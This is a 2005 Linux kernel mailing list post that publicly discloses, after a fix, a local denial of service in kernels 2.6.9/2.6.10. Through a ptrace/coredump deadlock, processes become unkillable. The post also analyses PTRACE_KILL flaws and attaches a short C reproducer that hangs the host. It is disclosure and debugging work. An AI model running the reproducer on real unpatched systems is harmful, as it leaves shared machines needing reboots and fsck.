Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261262AbVCQTTR@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261262AbVCQTTR (ORCPT <rfc822;willy@w.ods.org>);
	Thu, 17 Mar 2005 14:19:17 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261268AbVCQTTR
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Thu, 17 Mar 2005 14:19:17 -0500
Received: from smtp001.mail.ukl.yahoo.com ([217.12.11.32]:29278 "HELO
	smtp001.mail.ukl.yahoo.com") by vger.kernel.org with SMTP
	id S261262AbVCQTS5 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Thu, 17 Mar 2005 14:18:57 -0500
From: Blaisorblade <blaisorblade@yahoo.it>
Subject: Fwd: Re: 2.6.9/2.6.10 host local DoS due to ptrace.
Date: Thu, 17 Mar 2005 20:15:13 +0100
User-Agent: KMail/1.7.2
To: LKML <linux-kernel@vger.kernel.org>, security@kernel.org,
       Bodo Stroesser <bstroesser@fujitsu-siemens.com>
Cc: user-mode-linux-devel@lists.sourceforge.net
MIME-Version: 1.0
Content-Type: Multipart/Mixed;
  boundary="Boundary-00=_CddOCcn3PMnK+SC"
Message-Id: <200503172015.14298.blaisorblade@yahoo.it>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

--Boundary-00=_CddOCcn3PMnK+SC
Content-Type: text/plain;
  charset="iso-8859-15"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

The mail I'm forwarding describes a local DoS problem of 2.6.9/2.6.10, solved 
in 2.6.11 to my knowledge (and probably, before, in the -ac tree). I.e. the 
creation of unkillable processes due to a signal deadlock (not a race).

So, I guess now that it's solved it's time to publicly disclose it... after 
three months it's time. I'm no security expert, I only met this problem 
because it has bitten many UML users (everybody using UML on those host 
releases, until UML workarounded it). Credits go to Bodo Stroesser who 
diagnosed the exact cause of the problem.

----------  Forwarded Message  ----------

Subject: Re: [uml-devel] 2.6.9-bb3 on 2.6.9 host problem - triggering a host 
bug?
Date: Friday 03 December 2004 13:56
From: Bodo Stroesser <bstroesser@fujitsu-siemens.com>
To: Roland Mc Grath <roland@redhat.com>
Cc: Andrew Morton <akpm@osdl.org>, BlaisorBlade <blaisorblade_spam@yahoo.it>, 
Jeff Dike <jdike@addtoit.com>, torvalds@osdl.org

Bodo Stroesser wrote:
> Blaisorblade wrote:
>> On Monday 29 November 2004 23:15, Blaisorblade wrote:
>>
>> However, I've now discovered that it only happens when
>> CONFIG_STATIC_LINK is enabled - that makes the kernel die. The
>> interesting thing is that it becomes unkillable
>
> Have found the reason for the task to become unkillable, i.e. state 'D'.
>
> There is a bug in 2.6.9 and up in fs/exec.c
>
> If the kernel does coredump_wait(), it tries to kill all other threads,
> that are
> running on the same mm. Therefore it calls "force_sig_specific(SIGKILL,
> p)".
> But if one of the threads is on a ptrace-stop, SIGKILL has no effect.
> The killing thread will wait forever in "D".
>
> Bodo

Recently I've sent the above mail to LKML and user-mode-linux-devel.

Meanwhile BlaisorBlade pointed out in a private mail, that the problem
I described makes a local DoS attack possible. The threads hanging
unkillable in "D" and "T" block some resources. E.g. unmounting some FS
becomes impossible. Only a reboot breaks up the situation, but a fsck is
needed, because even on shutdown the umount fails.

So, intentionally without involving the list, I send you the source of
my small testtool, that reproduces the problem (attached).
Also, let me summarize the problems and inconsistencies regarding
ptrace, we notice.


1) The "D"-state hang

Look at the situation, that two threads are running on the same mm
(clone(CLONE_VM)). Assume the father is ptracing its child, the child is
stopped by calling ptrace_stop(), i.e. its state is TASK_TRACED/"T". If
the father segfaults now, the kernel calls coredump_wait(), to kill the
child and to wait uninteruptible, until the child exits. To kill the
child, it calls "force_sig_specific(SIGKILL,p)". But since the child is
in state TASK_TRACED, this has no effect and the father waits unkillable
forever in state-"D" for child's exit. The child in "T" again can be
waken up by its father only. Thus, we have a hang.


2) General ptrace problems

Before TASK_TRACED was inserted, a ptraced process in most cases could
be killed by kill(SIGKILL), since its state was "TASK_STOPPED.
But, AFAICS, there was at least one situation, where the killed process
didn't exit: if the ptraced process was stopped on the first
syscall-interception (PTRACE_SYSCALL), the kill woke it up, but it
stopped again on the second interception, without SIGKILL being
delivered.

With TASK_TRACED inserted, a kill(SIGKILL) queues the SIGKILL only, but
no longer wakes up the ptraced process, if its state is TASK_TRACED.
Instead ptrace(PTRACE_KILL) should be used. PTRACE_KILL is allowed to
be called, even if the ptraced process is not in TASK_STOPPED nor in
TASK_TRACED. I guess, this is to allow killing the process
unconditionally. Unfortunately it doesn't work unconditionally, but only
if the ptraced process is stopped on a ptrace-interception. This is,
because PTRACE_KILL does not send_sig(SIGKILL), but writes SIG_KILL to
exit_code only. When the process is woken up and returns from
ptrace_stop/ptrace_notify, the calling routines have to check exit_code
to make shure, that SIGKILL (or another signal) is queued. Unfortunately,
not all callers of ptrace_notify do this. Thus, sometimes no signal is
generated. For a running process, nothing happens at all. A process
waiting for a event is woken up, but will no see a SIGKILL.

Furthermore, PTRACE_KILL doesn't reset TIF_SYSCALL_TRACE and
TIF_SINGLESTEP. Thus, in some situations, even if SIGKILL is queued, the
process nevertheless might stop again on a ptrace-stop before SIGKILL is
delivered.

My idea to make this all more consistent, is to insert a ckeck for
(exit_code != 0) into ptrace_notify, to generate a signal from there
instead of leaving this task at the caller. With (exit_code == SIGKILL),
ptrace_notify immediately should start exit-processing.
Additionally, PTRACE_KILL should really queue a SIGKILL, by calling
send_sig(), to kill processes, that are not stopped. And it should reset
all the TIF_XXXX bits, that could make a ptrace-stop happen.
Lastly, there might be some races. E.g., there could be a ptraced process
on its way to ptrace_stop, since it has seen the TIF_SYSCALL_TRACE being
set, but its state isn't yet TASK_STOPPED. A PTRACE_KILL, done before
that process has reached TASK_TRACED, has no effect at all, even with the
changes I described. IMHO, for this a solution should be found.

Bodo

-------------------------------------------------------

-- 
Paolo Giarrusso, aka Blaisorblade
Linux registered user n. 292729
http://www.user-mode-linux.org/~blaisorblade

--Boundary-00=_CddOCcn3PMnK+SC
Content-Type: text/plain;
  name="test_hostbug.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="test_hostbug.c"

#include <stdio.h>
#include <signal.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <asm/ptrace.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <errno.h>

char childstack[ 8*1024];


int my_getpid()
{
	long res;
	__asm__ volatile ("	int $0x80\n\t"
				: "=a" (res)
				: "0" (__NR_getpid));
	return res;
}


void
parent_fn( pid_t child)
{
	int status;

	printf("Parent: childs PID is %d\n", child);

	if ( waitpid( child, &status, 0) != child ) {
			fprintf( stderr, "Parent: ");
			perror("waitpid");
			exit(1);
	}
	if ( !WIFSTOPPED(status) || WSTOPSIG(status) != SIGTRAP ) {
		printf("Unexpected status %04x received\n", status);
		exit(1);
	}

	*(char *)0x12345678 = 'A';
}


int
child_fn( void * unused)
{
	printf("Child: my PID is %d\n", my_getpid());

	if ( ptrace( PTRACE_TRACEME, 0, (void *)0, (void *)0) ) {
		fprintf( stderr, "        Child: ");
		perror("ptrace( PTRACE_TRACEME, 0, 0, 0)");
		exit(1);
	}
	kill( my_getpid(), SIGTRAP);

	printf("You should never read this text!!!!\n");

	return 0;
}


int
main( void)
{
	pid_t child;

	printf("Parent: my PID is %d\n", my_getpid());

	child = clone( child_fn, childstack+8*1024-4, CLONE_VM|SIGCHLD, (void *)NULL);

	if ( child < 0 ) {
		perror("clone");
		exit(1);
	}
	parent_fn( child);

	return 0;
}

--Boundary-00=_CddOCcn3PMnK+SC--


